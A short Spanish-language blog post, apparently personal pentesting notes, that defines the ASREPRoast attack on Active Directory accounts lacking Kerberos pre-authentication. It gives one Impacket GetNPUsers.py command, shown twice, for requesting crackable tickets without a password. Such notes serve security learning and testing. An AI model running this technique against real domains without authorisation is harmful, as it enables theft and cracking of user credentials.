---
layout: single
title: ASREPRoast
excerpt: "Qué es y cómo explotar un ASREPRoast Attack. Técnica que se utiliza en Active Directory."
date: 2021-12-07
classes: wide
header:
  teaser: /assets/images/Tools/bash-icon.png
  teaser_home_page: true
  icon: /assets/images/tool.png
categories:
  - Tools
tags:
  - CLI
  - Active Directory

---


# Definición
El ASREPRoast attack busca **usuarios sin Kerberos pre-authentication required attribute (_DONT_REQ_PREAUTH_)** de un [Active Directory](/Active-Directory/)

## GetNPUsers.py
Herramienta para solicitar un TGT o Ticket Granting Ticket y posteriormente romperlo por fuerza bruta.

### TGT sin contraseña
```bash
GetNPUsers.py dominio.local/ -no-pass -usersfile users
```
Ex:
```bash
GetNPUsers.py dominio.local/ -no-pass -usersfile users
```


---

Escrito el 07-12-2021 a las 06:54 pm por creep33.
